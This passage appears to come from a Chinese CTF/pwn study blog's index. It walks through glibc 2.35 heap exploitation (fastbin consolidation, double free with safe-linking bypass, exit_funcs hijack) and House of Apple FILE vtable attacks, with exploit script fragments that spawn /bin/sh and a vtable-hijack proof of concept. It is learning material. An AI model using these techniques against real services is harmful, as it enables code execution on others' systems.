u64(res[2*8:3*8]) -1936 base_libc = u64(res[5*8:6*8]) -2206944 \",\"chunk进入unsortedbin\",\"image-20240418132947766\",\"free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可\",\"image-20240418133015055\",\"申请回来\",\"image-20240418133239908\",\"然后write直接泄露即可\"]},\"374\":{\"h\":\"伪造fake chunk\",\"t\":[\"最消耗时间的一步\",\"这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为头chunk 记录内容chunk的size isUsed point\",\"point指向的就是内容chunk\",\"为了绕过isUsed的检测 我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉 这样就能随意控制isUsed和point了 实现任意free 所以我们选择触发fastbin的合并 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制内容chunk刚好为原本某一个的头chunk\"]},\"375\":{\"h\":\"示意图\",\"t\":[\"image-20240418134333731\",\"这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了\"]},\"376\":{\"h\":\"fastbin合并机制\",\"t\":[\"范围:2.35\",\"我们可以通过申请large bin chunk 来触发合并\",\"我们可以通过让topchunk消耗完毕 然后触发合并\",\"由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk\",\"Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式\",\"连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并\",\"# tcache 0x20 0x90均存满 # 剩下0xf3c7d0 for i in range(760): add(14,128,b\\\"a\\\"*0x18) for i in range(6): add(i,0x18,b\\\"a\\\"*0x8) # 防止fastbin合并后直接被topchunk合并 add(7,8,b\\\"a\\\"*8) for i in range(6): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x30,b\\\"a\\\"*8) \",\"合并之前\",\"image-20240418151026231\",\"合并后\",\"image-20240418151102406\"]},\"377\":{\"h\":\"构造fakecchunk\",\"t\":[\"fakechunk = {} fakechunk[\\\"size\\\"] = p64(0x21) fakechunk[\\\"prev_size\\\"] = p64(0) fakechunk[\\\"chunk_list_size\\\"] = p64(0x100) fakechunk[\\\"isUsed\\\"] = p64(1) // 为触发泄露tls+0x30的double free的fastbinchunk地址 fakechunk[\\\"buff\\\"] = p64(fd) # 已经完成覆写 free index5则可实现任意free add(14,0x58,b\\\"a\\\"*16+fakechunk[\\\"prev_size\\\"]+fakechunk[\\\"size\\\"]+fakechunk[\\\"chunk_list_size\\\"]+fakechunk[\\\"isUsed\\\"]+fakechunk[\\\"buff\\\"]) \",\"此时index为5 就是我们劫持的头chunk 这里的fd就是我们后面要free的任意chunk\",\"image-20240418151731938\"]},\"378\":{\"h\":\"泄露tls+0x30\",\"t\":[\"由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域\",\"难点\",\"我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大\",\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc\",\"glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差\",\"# 构造一个double free for i in range(6,11): add(i,0x18,b\\\"a\\\"*16) # 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除 add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30))) for i in range(6,11): delete(i) delete(5) for i in range(7): add(i,0x48,b\\\"a\\\"*8) add(7,0x48,p64((xor)^(tls))) for i in range(2): add(i,0x48,b\\\"a\\\"*8) add(0,0x48,b\\\"\\\\x00\\\") # 泄露tls中信息 res = view(0) \",\"首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）\",\"if (__builtin_expect(old == p, 0)) malloc_printerr(\\\"double free or corruption (fasttop)\\\"); p->fd = PROTECT_PTR(&p->fd, old); *fb = p; \",\"image-20240420123457567\",\"然后将利用开始构造好的fakechunk进行free\",\"delete(5) \",\"image-20240420123602766\"]},\"379\":{\"h\":\"fd加密机制\",\"t\":[\"glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可\",\"fd需要是heap基地址^目标地址\"]},\"380\":{\"h\":\"劫持exit_funcs链表\",\"t\":[\"最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写\",\"本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来\",\"难点 \",\"因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了\",\" # size: 0x20c30 for i in range(758): add(14,128,b\\\"a\\\"*8) for i in range(11): add(i,0x18,b\\\"a\\\"*8) add_with_no_chunk(14) for i in range(11): delete(i) # 将topchunk消耗空触发合并 add(14,0x68,b\\\"a\\\"*8) # 指定free index 6 可以实现任意free # free_chunk就是后续构造double free的chunk地址 free_chunk = base_heap+271376+0x10 add(14,128,b\\\"a\\\"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk)) # 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数 for i in range(6): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(7,13): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(6): delete(i) for i in range(7,13): delete(i) # 触发double free delete(6) for i in range(7): add(i,0x68,b\\\"a\\\"*8) # 将fd指向exit_function地址处 add(i,0x68,p64((xor+0x21)^exit_function)) add(0,0x68,b\\\"a\\\"*8) add(0,0x68,b\\\"/bin/sh\\\\x00\\\") res = getData(res) # 获取key的值 res = res[6] # 计算出key加密后的地址 manba = remove_high_digits(rol(0x401700^res),16) addr = remove_high_digits(rol(system_addr^res),16) print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420)) ru(b\\\">>> \\\") sl(b\\\"5\\\") print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) ia() \"]},\"381\":{\"h\":\"house of apple 原理细学习\"},\"382\":{\"h\":\"参考文章:\",\"t\":[\"[原创] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"glibc 2.35 pwn——house of apple v1 示例程序_pwn house of apple-CSDN博客\"]},\"383\":{\"h\":\"条件\",\"t\":[\"触发exit函数 / main函数返回\",\"泄露heap地址 libc地址\",\"可进行largebin attack\"]},\"384\":{\"h\":\"house_of_apple1原理\",\"t\":[\"这里阅读了大致逻辑后进行总结\",\"首先是通过一次largebin劫持_IO_list_all 伪造\",\"构造时将vatble填写_IO_wstrn_jumps\",\"触发exit函数 exit调用_IO_flush_all_lockp（原本会遍历所有的File结构体依次执行overflow函数）由于我们劫持了vtable 所以最终调用了_IO_wstrn_overflow函数 会将File结构体中的_wide_data字段保存的地址附近写入值\"]},\"385\":{\"h\":\"覆盖vatble\",\"t\":[\"也就是覆盖FILE结构体0xd8偏移位置的数据 为_IO_wstrn_jumps地址\",\"image-20240423173604690\"]},\"386\":{\"h\":\"触发exit\",\"t\":[\"fcloseall\",\"image-20240423194735581\",\"_IO_cleanup\",\"image-20240423194855564\"]},\"387\":{\"h\":\"调用_IO_wstrn_overflow\",\"t\":[\"_IO_wstrn_jumps:\",\"image-20240423173959024\",\"提取vatble(_IO_wstrn_jumps)调用overflow\",\"image-20240423174606432\",\"调用_IO_wstrn_jumps的_IO_wstrn_overflow函数\",\"image-20240423174817889\"]},\"388\":{\"h\":\"覆写数据\",\"t\":[\"根据_IO_wstrn_overflow可以知道fp->_wide_data地址所指区域会被覆写上overflow_buff 我们结合结构体来理解一下\",\"可以发现_wide_data位于偏移0xa0 其中_wide_data偏移从0x0到0x30地址处都会被覆写上fp->overflow_buf(偏移0xf0)\",\"那么就是我们构造的FILE结构体 vtable(0xd8)写上_IO_wstrn_jumps地址 overflow_buf(0xf0)写上我们想要覆盖的数据 比如\",\"backdoor地址之类的 _wide_data(0xa0)覆盖上我们想要修改的地址 那么最终就会在目标地址0x0到0x30处覆盖上我们的0xf0偏移处的数据\"]},\"389\":{\"h\":\"结构体 _IO_FILE_complete\",\"t\":[\"这个结构体包含了_IO_FILE结构体全部内容\",\"struct _IO_FILE_complete { struct _IO_FILE _file; #endif __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; \",\"image-20240423181313898\"]},\"390\":{\"h\":\"结构体 _IO_wide_data\",\"t\":[\"struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \",\"查看一下偏移 gdb使用指令:p *&_IO_wide_data_0和tel &_IO_wide_data_0\",\"image-20240423181623582\"]},\"391\":{\"h\":\"结构体 _IO_wstrnfile\",\"t\":[\"typedef struct { _IO_strfile f; /* This is used for the characters which do not fit in the buffer provided by the user. */ wchar_t overflow_buf[64]; } _IO_wstrnfile; \"]},\"392\":{\"h\":\"示意图\",\"t\":[\"image-20240425164628090\"]},\"393\":{\"h\":\"house_of_apple 2原理\",\"t\":[\"学习文章:[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"核心还是劫持vtable 只不过需要绕过一下新版本中对vtable地址的检测 这里主要是讲一下原理 其他部分还是主要做题遇到再查\"]},\"394\":{\"h\":\"_IO_OVERFLOW调用\",\"t\":[\"#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1) #define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) \",\"我们可以发现这个调用最终会调用IO_validate_vtable 然后会触发检查vatble是否合法 所以我们得想办法绕过\"]},\"395\":{\"h\":\"_IO_wfile_overflow的调用\",\"t\":[\"这个函数存在于 _IO_wfile_jumps ,_IO_wfile_jumps_mmap和_IO_wfile_jumps_maybe_mmap等虚表中 所以我们的vtable直接填写这三个中任意一个即可 我们可以发现调用这个的时候并不存在vatble的检查 这样我们就可以轻松愉快地劫持vatble了\",\"const struct _IO_jump_t _IO_wfile_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; const struct _IO_jump_t _IO_wfile_jumps_mmap libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf_mmap), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close_mmap), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf_mmap), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; \",\"我们看看这个函数的调用链\",\"#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\\\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable \",\"我们可以发现这里就没有vatble的检查了\",\"所以我们可以将 vtable改为_IO_wfile_jumps(加减偏移) 触发exit函数\",\"这样就会调用_IO_wfile_overflow函数\",\"以及我们发现这里调用的是_wide_data->_wide_vatble 已经知道_wide_data相对于File结构体来说偏移值为0xa0 我们可以在伪造的File结构体0xa0位置填写上可控的一个chunk地址 这个chunk写上我们想要调用的函数\"]},\"396\":{\"h\":\"示意图\",\"t\":[\"总结就是(仅伪造_wide_data) 我们要伪造三个chunk 一个在_wide_data(0xa0)位置写入指针指向第二个chunk 然后第二个chunk要在_wide_vtable（0xe0）位置写第三个chunk 0x18位置写入我们要触发的函数 这样就完成了一次函数的劫持\",\"image-20240425165104955\"]},\"397\":{\"h\":\"原理脚本\",\"t\":[\"这里贴出[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com文章中的脚本\",\"关于_IO_FILE_plus结构体部分\",\"_flags (0x0)改为0x800\",\"_mode(0xc0)设置为1\",\"vtable(0xd8)设置为_IO_wstrn_jumps-0x20\",\"_wide_data(0xa0)设置为fake _wide_data\",\"关于_wide_data\",\"_wide_vatble(0xe0)设置为fake _wide_vatble\",\"关于_wide_vatble\",\"0x18位置改为我们要执行函数的地址\",\"#include<stdio.h> #include<stdlib.h> #include<stdint.h> #include<unistd.h> #include <string.h> void backdoor() { printf(\\\"\\\\033[31m[!] Backdoor is called!\\\\n\\\"); _exit(0); } void main() { setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); char *p1 = calloc(0x200, 1); char *p2 = calloc(0x200, 1); puts(\\\"[*] allocate two 0x200 chunks\\\"); size_t puts_addr = (size_t)&puts; printf(\\\"[*] puts address: %p\\\\n\\\", (void *)puts_addr); size_t libc_base_addr = puts_addr - 0x84420; printf(\\\"[*] libc base address: %p\\\\n\\\", (void *)libc_base_addr); size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0; printf(\\\"[*] _IO_2_1_stderr_ address: %p\\\\n\\\", (void *)_IO_2_1_stderr_addr); size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60; printf(\\\"[*] _IO_wstrn_jumps address: %p\\\\n\\\", (void *)_IO_wstrn_jumps_addr); char *stderr2 = (char *)_IO_2_1_stderr_addr; puts(\\\"[+] step 1: change stderr->_flags to 0x800\\\"); *(size_t *)stderr2 = 0x800; puts(\\\"[+] step 2: change stderr->_mode to 1\\\"); *(size_t *)(stderr2 + 0xc0) = 1; puts(\\\"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20\\\"); *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20; puts(\\\"[+] step 4: replace stderr->_wide_data with the allocated chunk p1\\\"); *(size_t *)(stderr2 + 0xa0) = (size_t)p1; puts(\\\"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2\\\"); *(size_t *)(p1 + 0xe0) = (size_t)p2; puts(\\\"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr > stderr->_wide_data->_wide_vtable->_IO_write_base\\\"); *(size_t *)(p1 + 0x20) = (size_t)1; puts(\\\"[+] step 7: put backdoor at fake _wide_vtable->_overflow\\\"); *(size_t *)(p2 + 0x18) = (size_t)(&backdoor); puts(\\\"[+] step 8: call fflush(stderr) to trigger backdoor func\\\"); fflush(stderr); } \"]},\"398\":{\"h\":\"浅学习Io_file\",\"t\":[\"io_file相关学习有点蛋疼 感觉较为复杂 找到了大佬的blog感觉摸到了皮毛 为了深入\",\"整体脉络:IO_FILE相关利用 | Alex's blog~ (la13x.github.io)\",\"源码阅读:IO函数源码阅读 (bambooiii.github.io)\"]},\"399\":{\"h\":\"核心结构体\",\"t\":[\"struct _IO_FILE_plus { FILE file; // 这里是常量指针 请记住和指针常量的区别 // 指针常量本质是常量 存储的是指针 也就是说其记录的指针不能被修改 但是指针指向的内容是可以修改的 // 常量指针是指针 只不过指针所指向的地址得是个常量 所以指针本身值可以被修改 但是其内容不可被修改 // 所以在开发者最初设想中 这里的vtable的值可以改变 但是它指向的内容是不可变的 // vtable指向的是类型为_IO_jump_t的常量数据 const struct _IO_jump_t *vtable; }; \"]},\"400\":{\"h\":\"file\",\"t\":[\"一般开发的时候 我们喜欢把write 和open等函数操作的文件 叫做文件流 (file) 在以前我的理解就是这是存储的文件数据的一个结构\",\"fread 和fwrite函数需要文件流指针调用虚表函数\",\"fopen函数会自动通过malloc 创建 file(文件流) 所以这里_IO_FILE_plus结构体的第一个属性file就是存储这个文件流的（倒不如说它就是文件流）\",\"代码过于复杂 暂时不搬出来了 这里我们理解即可(大概)\"]},\"401\":{\"h\":\"vtable\",\"t\":[\"这里我是这样理解的当我们自己设计一个文件读取管理器 我们如何设计一个结构体？方便我们进行处理\",\"我可能会选择这样 先创建一个FILE结构体 然后一个属性为data也就是数据本身 然后各种回调函数属性\",\"这样我们只需要调用FILE.xxxxxx()函数就可以轻易完成对文件地操作 所以这里的设计了一个vtable 指针\",\"用于指向各种处理函数 方便我们进行调用\",\"指向的是一个类型为_IO_jump_t的常量数据 这个数据主要存着各种函数\",\"struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); }; \"]},\"402\":{\"h\":\"IO函数函数的原理\",\"t\":[\"这里阅读一下IO函数的源码 方便我们直观看见 _IO_FILE_plus结构体与这些相关函数的联系 如果只是想要懂个流程就是浏览一下这部分就行 如果要详细了解一下就看文章后面调试深入理解部分的内容 这里推荐自己用有符号的libc自己调试几下 一会儿思维就通了\"]},\"403\":{\"h\":\"fopen函数\",\"t\":[\"分配对应大小的空间\",\" struct locked_FILE { struct _IO_FILE_plus fp; #ifdef _IO_MTSAFE_IO //没执行 _IO_lock_t lock; #endif struct _IO_wide_data wd; } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); //first:分配空间 \",\"初始化_IO_FILE_plus结构体数据 by _IO_no_init\",\"这里的初始值几乎全部都是赋值的null\",\"if (new_f == NULL) return NULL; #ifdef _IO_MTSAFE_IO //没执行 new_f->fp.file._lock = &new_f->lock; #endif _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps); //second：初始化 _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; //说明所有的_io_file_jump都是同一个vtable \",\"将_IO_FILE_plus结构体链接到_IO_list_all by _io_file_init_internal\",\"相当于让_io_file_plus入链 假如之前_IO_list_all指向的stderr则链接后\",\"_io_list_all ->fp->stderr (fp._chain->stderr) 这里上大佬的图\",\"fpmKdFRYo6VeTh5\",\" _IO_new_file_init_internal (&new_f->fp);//third：将file链接到_IO_list_all \",\"打开文件 by _IO_file_fopen\",\" if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) //forth：打开文件 return __fopen_maybe_mmap (&new_f->fp.file); \",\"函数尾部\",\"_IO_un_link (&new_f->fp); free (new_f); return NULL; \"]},\"404\":{\"h\":\"调试源码 深入理解\",\"t\":[\"#include <stdio.h> #define system_ptr 0x7ffff7a52390; #include <string.h> int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\\\"flag.txt\\\",\\\"rw\\\"); vtable_ptr=(long long*)((long long)fp+0xd8); //get vtable memcpy(fp,\\\"sh\\\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\\\"hi\\\",2,1,fp); } \"]},\"405\":{\"h\":\"进入open64\",\"t\":[\"image-20240327010609541\"]},\"406\":{\"h\":\"malloc 部分\"},\"407\":{\"h\":\"源码\",\"t\":[\" struct locked_FILE { struct _IO_FILE_plus fp; #ifdef _IO_MTSAFE_IO //没执行 _IO_lock_t lock; #endif struct _IO_wide_data wd; } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); \"]},\"408\":{\"h\":\"调试\",\"t\":[\"image-20240327011453742\",\"malloc 后new_f的值\",\"image-20240327011540293\",\"$2 = { fp = { file = { _flags = 0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\\\\000', _shortbuf = \\\"\\\", _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\\\000' <repeats 19 times> }, vtable = 0x0 }, lock = { lock = 0, cnt = 0, owner = 0x0 }, wd = { _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _IO_state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } }, _IO_last_state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } }, _codecvt = { __cd_in = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } } } }, __cd_out = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } } } } }, _shortbuf = L\\\"\\\", _wide_vtable = 0x0 } } \",\"扩展: wd结构体\",\"struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ //unsigned short wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \"]},\"409\":{\"h\":\"初始化 _IO_no_init\"},\"410\":{\"h\":\"源码\",\"t\":[\"_IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps); //second：初始化 // _IO_no_init源码 void _IO_no_init (FILE *fp, int flags, int orientation, struct _IO_wide_data *wd, const struct _IO_jump_t *jmp) { _IO_old_init (fp, flags); fp->_mode = orientation; if (orientation >= 0) { fp->_wide_data = wd; fp->_wide_data->_IO_buf_base = NULL; fp->_wide_data->_IO_buf_end = NULL; fp->_wide_data->_IO_read_base = NULL; fp->_wide_data->_IO_read_ptr = NULL; fp->_wide_data->_IO_read_end = NULL; fp->_wide_data->_IO_write_base = NULL; fp->_wide_data->_IO_write_ptr = NULL; fp->_wide_data->_IO_write_end = NULL; fp->_wide_data->_IO_save_base = NULL; fp->_wide_data->_IO_backup_base = NULL; fp->_wide_data->_IO_save_end = NULL; fp->_wide_data->_wide_vtable = jmp; } else /* Cause predictable crash when a wide function is called on a byte stream. */ fp->_wide_data = (struct _IO_wide_data *) -1L; fp->_freeres_list = NULL; } \"]},\"411\":{\"h\":\"调试\",\"t\":[\"image-20240327011904072\",\"执行后new_f变化\",\"(*new_f).file._flags变化\",\" _flags = -72548352, \",\"(*new_f).wd._wide_vtable 变化\",\"_wide_vtable = 0x7ffff7fb5f60 <_IO_wfile_jumps> \"]},\"412\":{\"h\":\"vtable表赋值\"},\"413\":{\"h\":\"源码\",\"t\":[\"_IO_JUMPS(&new_f->fp) = &_IO_file_jumps; \"]},\"414\":{\"h\":\"调试\",\"t\":[\"image-20240327013258111\",\"我们对_io_file_jumps数据进行查看一下 满足好奇心\",\"可以发现就是塞满了各种函数\",\"image-20240327013517671\",\"image-20240327013607798\"]},\"415\":{\"h\":\"链接部分\"},\"416\":{\"h\":\"源码\",\"t\":[\"_IO_new_file_init_internal(&new_f->fp); 